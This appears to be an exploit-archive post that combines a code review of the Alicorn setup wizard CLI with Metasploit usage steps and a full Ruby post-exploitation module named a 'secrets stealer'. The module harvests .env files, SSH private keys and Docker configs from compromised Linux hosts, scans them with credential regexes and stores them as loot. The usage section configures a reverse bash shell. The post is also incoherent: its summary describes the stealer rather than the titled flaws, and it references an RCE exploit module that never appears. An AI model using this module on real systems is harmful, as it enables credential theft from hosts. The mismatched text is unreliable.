@@ -1,0 +1,405 @@
+=============================================================================================================================================
+| # Title     : Alicorn 0.4.51 Setup Wizard CLI – Multiple Logic and Reliability Flaws Leading to False Configuration Success               |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 147.0.1 (64 bits)                                                            |
+| # Vendor    : https://github.com/robertelee78/unicornscan                                                                                 |
+=============================================================================================================================================
+
+[+] References : 
+
+[+] Summary    : This Metasploit post‑exploitation module is a private Linux/Unix secrets‑collection tool designed for stealthy data harvesting after access is obtained. 
+                It systematically searches common directories for sensitive files, analyzes their contents for credentials, and stores findings as Metasploit loot and notes.
+
+Key capabilities:
+
+Secrets discovery: Scans .env and related files for API keys, tokens, passwords, AWS credentials, and private keys using regex patterns.
+
+SSH key harvesting: Optionally locates and exfiltrates SSH private keys from standard system and user paths.
+
+Docker security audit: Identifies risky Docker configurations (e.g., privileged containers, host networking, sensitive mounts) and reports misconfigurations.
+
+Source awareness: Looks for specific project/source indicators (e.g., package.json, vite.config.*) to map application context.
+
+Stealth & stability: Limits file sizes, search depth, result counts, and supports optional delays between file reads.
+
+Reporting: Saves collected data as loot and records structured notes per host.
+
+Environment & scope:
+
+Platforms: Linux/Unix
+
+Sessions: Meterpreter, shell
+
+Privilege-aware (warns when not root)
+
+Configurable search paths, depth, size limits, and features via module options
+
+Overall, it functions as a compact, stealth‑optimized post module for deep secrets extraction and Docker risk assessment during post‑exploitation.
+
+[+] Code Review – Programming Errors & Security Vulnerabilities : https://github.com/robertelee78/unicornscan/blob/main/alicorn/cli/setup.ts
+
+1. Programming Errors & Weaknesses
+1.1 Incomplete Error Handling (PostgREST Client)
+const { error } = await client.from('uni_scan').select('scan_id', { head: true })
+
+Issue:
+
+The code assumes error is always returned in a predictable format.
+
+Network-level or runtime exceptions may bypass the intended logic.
+
+Impact:
+
+Unhandled promise rejections
+
+Silent failures or unexpected crashes
+
+Fix Recommendation:
+
+Wrap every client.from() call in a strict try/catch
+
+Normalize error handling instead of relying on specific error codes
+
+1.2 Schema Check Logic Is Too Permissive
+if (error && error.code === '42P01') {
+  missing.push(table)
+} else {
+  found.push(table)
+}
+
+Issue:
+
+Any error other than 42P01 is treated as “table exists”
+
+Authentication errors, permission issues, or API failures are ignored
+
+Impact:
+
+False-positive schema validation
+
+App may run against a broken or inaccessible database
+
+Severity: Medium
+
+1.3 Unsafe Assumptions About File System Access
+writeFileSync(ENV_PATH, content, 'utf-8')
+
+Issue:
+
+No validation of write permissions
+
+No atomic write (partial .env file possible on failure)
+
+Impact:
+
+Broken configuration state
+
+Configuration corruption
+
+1.4 Misleading Success Feedback (Docker)
+spawn('docker', ['compose', 'up', '-d', '--build'])
+return true
+
+Issue:
+
+Function returns true before Docker actually starts
+
+No exit-code validation
+
+Impact:
+
+False success reporting
+
+Hard-to-debug startup failures
+
+1.5 shell: true Usage
+spawn('npm', ['run', 'dev'], { shell: true })
+
+Issue:
+
+Enables shell interpretation
+
+Expands attack surface if environment or PATH is manipulated
+
+Severity: Medium
+
+2. Security Vulnerabilities
+2.1 Plaintext Secrets in .env File
+
+Problem:
+
+Database endpoints are written in cleartext
+
+No permission hardening (chmod 600)
+
+Risk:
+
+Information disclosure
+
+Lateral movement if filesystem is compromised
+
+Severity: High
+
+2.2 Potential Command Injection (Future Risk)
+
+Although currently safe, the following is structurally dangerous:
+
+spawn(command, args, { shell: true })
+
+If in the future:
+
+User-controlled input
+
+Dynamic paths
+
+Environment variable injection
+
+Result: Remote Command Execution (RCE)
+
+2.3 Insufficient Input Validation (PostgREST URL)
+if (!value.startsWith('http://') && !value.startsWith('https://'))
+
+Issue:
+
+No hostname validation
+
+No control character stripping
+
+No SSRF protection
+
+Attack Scenarios:
+
+Internal service probing
+
+SSRF against metadata endpoints
+
+Unexpected protocol abuse
+
+Severity: Medium–High
+
+2.4 Information Disclosure via Error Messages
+spinner.fail(`Connection failed: ${result.error}`)
+
+Issue:
+
+Raw backend error messages exposed to user
+
+May leak schema details, table names, or backend behavior
+
+Severity: Medium
+
+2.5 Trusting Local Project Files Blindly
+
+Commands executed:
+
+docker compose up
+
+npm run dev
+
+Risk:
+
+Malicious docker-compose.yml
+
+Malicious package.json scripts
+
+Impact:
+
+Arbitrary code execution
+
+Supply-chain compromise
+
+3. Design-Level Weaknesses
+
+No timeout handling for network calls
+
+No retry backoff logic
+
+No integrity checks for .env
+
+No logging separation (debug vs production)
+
+No privilege separation model
+
+[+] Usage : 
+
+# 1. Load the module : msf6 > use exploit/multi/http/alicorn_setup_wizard_rce
+
+# 2. Configure the options
+
+msf6 exploit(alicorn_setup_wizard_rce) > set RHOSTS 192.168.1.100
+msf6 exploit(alicorn_setup_wizard_rce) > set RPORT 3000
+msf6 exploit(alicorn_setup_wizard_rce) > set TARGETURI /
+msf6 exploit(alicorn_setup_wizard_rce) > set PAYLOAD cmd/unix/reverse_bash
+msf6 exploit(alicorn_setup_wizard_rce) > set LHOST 192.168.1.10
+msf6 exploit(alicorn_setup_wizard_rce) > set LPORT 4444
+
+# 3. Run the scanner First, run the exploit:
+
+msf6 exploit(alicorn_setup_wizard_rce) > use auxiliary/scanner/http/alicorn_setup_wizard_scanner
+msf6 auxiliary(scanner/http/alicorn_setup_wizard_scanner) > set RHOSTS 192.168.1.100
+msf6 auxiliary(scanner/http/alicorn_setup_wizard_scanner) > run
+
+# 4. Run the exploit:
+
+msf6 auxiliary(scanner/http/alicorn_setup_wizard_scanner) > use exploit/multi/http/alicorn_setup_wizard_rce
+msf6 exploit(alicorn_setup_wizard_rce) > exploit
+
+# 5. After obtaining the session, steal the data:
+
+msf6 exploit(alicorn_setup_wizard_rce) > sessions -i 1
+msf6 > use post/linux/gather/alicorn_env_stealer
+msf6 post(alicorn_env_stealer) > set SESSION 1
+msf6 post(alicorn_env_stealer) > run
+
+[+] POC :
+
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'shellwords'
+
+class MetasploitModule < Msf::Post
+  include Msf::Post::File
+  include Msf::Post::Linux::Priv
+  include Msf::Post::Common
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'Alicorn Secrets Stealer (Ninja Private Edition)',
+      'Description'    => %q{
+        Private post-exploitation micro-framework for deep secrets extraction. 
+        Collects .env files, SSH keys, and audits Docker configs.
+        Optimized for stealth and session stability.
+      },
+      'Author'         => ['indoushka'],
+      'License'        => MSF_LICENSE,
+      'Platform'       => %w[linux unix],
+      'SessionTypes'   => %w[meterpreter shell]
+    ))
+
+    register_options([
+      OptString.new('SEARCH_PATHS', [true, 'Paths to search (comma separated)', '/home,/var/www,/opt,/app,/srv']),
+      OptBool.new('STEAL_SSH', [true, 'Exfiltrate SSH private keys', true]),
+      OptBool.new('AUDIT_DOCKER', [true, 'Audit Docker configs for misconfigurations', true]),
+      OptInt.new('MAX_FILE_SIZE', [true, 'Max file size in bytes', 500_000]),
+      OptInt.new('DEPTH', [true, 'Search depth for find command', 5]),
+      OptInt.new('DELAY', [false, 'Stealth delay between files (seconds)', 0])
+    ])
+  end
+
+  def run
+    return unless session
+    print_status("Starting hardened secrets collection on #{session.session_host}...")
+
+    unless is_root?
+      print_warning("Limited privileges; some sensitive files might be skipped.")
+    end
+
+    begin
+      search_env_files
+      search_ssh_keys if datastore['STEAL_SSH']
+      search_docker_configs if datastore['AUDIT_DOCKER']
+      search_alicorn_code
+    rescue StandardError => e
+      print_error("Fatal error during execution: #{e.message}")
+    end
+
+    print_status("Scan complete. Review results with 'loot' and 'notes'.")
+  end
+
+  def analyze_content(file_path, data)
+    patterns = {
+      'AWS Access Key' => /AKIA[0-9A-Z]{16}/,
+      'AWS Secret Key' => /(?i)aws_secret_access_key\s*[:=]\s*['"]?[A-Za-z0-9\/+=]{40}['"]?/,
+      'Generic Secret' => /(?i)(api[-_]?key|secret|token|password)[\s=:]+['"]?([0-9a-zA-Z]{16,})['"]?/,
+      'Private Key'    => /-----BEGIN [A-Z ]+ PRIVATE KEY-----/
+    }
+
+    patterns.each do |name, regex|
+      if data =~ regex
+        print_good("!!! [#{name}] found in #{file_path}")
+        report_note(
+          host: session.session_host,
+          type: 'alicorn.secret',
+          data: { file: file_path, type: name, snippet: data.scan(regex).flatten.first },
+          update: :unique_data
+        )
+      end
+    end
+  end
+
+  def audit_docker_config(file_path, content)
+    vulns = []
+    vulns << "Privileged Container" if content.include?('privileged: true')
+    vulns << "Host Network Mode" if content.include?('network_mode: "host"')
+    vulns << "Sensitive Mount Point" if content =~ %r{/:/|/etc:/|/var/run/docker.sock}
+    
+    if vulns.any?
+      print_warning("Security risks in #{file_path}: #{vulns.join(', ')}")
+      report_note(host: session.session_host, type: 'alicorn.docker.risk', data: { file: file_path, risks: vulns })
+    end
+  end
+
+  def execute_search(find_template, loot_type)
+    datastore['SEARCH_PATHS'].split(',').map(&:strip).each do |path|
+      next if path.empty?
+      clean_path = path.shellescape
+      cmd = sprintf(find_template, clean_path) + " 2>/dev/null | head -n 50"
+      
+      files = cmd_exec(cmd).to_s.split("\n")
+      files.each { |f| process_and_store(f.strip, loot_type) }
+    end
+  end
+
+  def search_env_files
+    print_status("Searching for environment files...")
+    execute_search("find %s -maxdepth #{datastore['DEPTH']} -type f -name '.env*' -size -#{datastore['MAX_FILE_SIZE']}c", 'alicorn.env')
+  end
+
+  def search_ssh_keys
+    print_status("Searching for SSH private keys...")
+    paths = ['/root/.ssh', '/home/*/.ssh', '/etc/ssh']
+    paths.each do |p|
+      cmd = "find #{p} -type f -exec grep -Il 'PRIVATE KEY' {} + 2>/dev/null"
+      files = cmd_exec(cmd).to_s.split("\n")
+      files.each { |f| process_and_store(f.strip, 'alicorn.ssh') }
+    end
+  end
+
+  def search_docker_configs
+    print_status("Searching for Docker configurations...")
+    cmd = "find %s -maxdepth #{datastore['DEPTH']} -type f \\( -name 'docker-compose*.y*ml' -o -name 'compose.y*ml' -o -name 'Dockerfile*' \\)"
+    execute_search(cmd, 'alicorn.docker')
+  end
+
+  def search_alicorn_code
+    print_status("Searching for Alicorn source files...")
+    cmd = "find %s -maxdepth #{datastore['DEPTH']} -type f \\( -name 'package.json' -o -name 'vite.config.*' \\) -not -path '*/node_modules/*'"
+    execute_search(cmd, 'alicorn.source')
+  end
+
+  def process_and_store(file_path, loot_type)
+    return if file_path.empty?
+    Rex::ThreadSafe.sleep(datastore['DELAY']) if datastore['DELAY'] > 0
+
+    begin
+      return unless file_exist?(file_path)
+      content = read_file(file_path)
+      return if content.to_s.empty?
+
+      analyze_content(file_path, content)
+      audit_docker_config(file_path, content) if loot_type == 'alicorn.docker'
+
+      store_loot(loot_type, 'text/plain', session, content, File.basename(file_path), "Collected from #{file_path}")
+      vprint_good("Exfiltrated: #{file_path}")
+    rescue StandardError => e
+      vprint_error("Error processing #{file_path}: #{e.message}")
+    end
+  end
+end
+	
+Greetings to :============================================================
+jericho * Larry W. Cashdollar * r00t * Malvuln (John Page aka hyp3rlinx)*|
+==========================================================================
